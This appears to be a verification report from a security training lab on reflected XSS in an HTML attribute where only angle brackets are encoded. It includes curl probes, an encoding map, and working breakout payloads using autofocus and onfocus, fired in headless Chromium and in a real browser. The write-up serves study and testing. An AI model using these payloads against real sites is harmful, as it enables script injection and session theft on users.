# Verification — Reflected XSS into attribute (`<>` encoded)

## Methodology
1. Reflection mapping (curl): one request per probe; grep EVERY occurrence of a unique
   marker to find all server reflections.
2. Per-context encoding map: send `"'<>&` once; read back each reflection's encoding.
3. Positive proof in a real parser with a side-effect assertion (numeric
   `document.title=` to avoid quote-balancing traps during proving).
4. Negative proofs: `<script>` neutralization in both contexts.
5. Diagnose-then-fix loop on failures (quoting bug, harness timing) — each failure is
   recorded with its mechanism.
6. Lab acceptance: real-browser `alert(1)`; banner polls.

## Evidence

### 1. Reflections found (curl, `?search=reconprobe`)
```
<h1>0 search results for 'reconprobe'</h1>
<input type=text placeholder='Search the blog...' name=search value="reconprobe">
```

### 2. Encoding map (curl, `?search=ENC"'<>&`)
```
h1   : ENC&quot;&apos;&lt;&gt;&amp;      → fully encoded (dead end)
value: ENC"'&lt;&gt;&                     → " ' & raw, only <> encoded (sink)
```
Reading: the SAME input is defended differently per location. Only the attribute is
exploitable, and only via `"` (double-quoted attribute) + event handler (no `<>`).

### 3. Positive execution proof (CDP-driven Chromium, 6s settle)
```
GET /?search=%22%20autofocus%20onfocus%3D%22document.title%3D918273
→ title: 918273 ; activeElement: the injected input ; document.hasFocus(): true
```
Handler `document.title=918273` ran on load via autofocus — zero clicks, zero errors.

### 4. Negative proofs
| Probe | Result |
|---|---|
| `?search=<script>alert(1)</script>` | `&lt;script&gt;…` in BOTH reflections — tag injection dead |
| `'`-breakout attempt (reasoned, unfired) | structurally inapplicable: `'` has no syntactic function inside a `"`-quoted attribute |

### 5. Failure diagnoses (both fixed, both instructive)
(a) **Missing quote after `onfocus=`**: first headless attempt used
`onfocus=document.title=…` (no `"`). The template's closing `"` was absorbed INTO the
unquoted attribute value (`onfocus=document.title=918273"`), producing a JS syntax
error — silent no-fire with a perfectly parsed DOM. Rule: account for EVERY quote on
both sides of your payload, including the template's own delimiters.
(b) **`--dump-dom` title staleness**: with a syntactically VALID handler, `dump-dom`
still showed the old title while CDP (6s settle) showed the fired one. Cause: dump
serializes at load, racing the async autofocus-focus task. Rule: `--dump-dom` is
unreliable for load-time focus-event assertions — drive via CDP with a settle wait,
or assert on `document.activeElement` + re-check.

### 6. Lab acceptance
Real browser tab → `/?search=%22%20autofocus%20onfocus%3D%22alert(1)` → alert on load →
banner `is-solved` (4/4 polls, first poll already solved).

## Reproducibility
```
BASE=…
# encoding map
curl -s "$BASE/?search=ENC%22%27%3C%3E%26" | grep -E "search results for|name=search value"
# execution proof (CDP): navigate to
#   $BASE/?search=%22%20autofocus%20onfocus%3D%22document.title%3D918273
# settle, assert document.title == "918273" and activeElement is the input
```

## Confirmation criteria
- CONFIRMED: per-context encoding map, autofocus/onfocus execution (title side-effect +
  focus state), `<script>` neutralization, real-browser `alert(1)` + acceptance.
- Structural (spec-axiomatic, unfired): `'` cannot terminate a `"`-quoted attribute.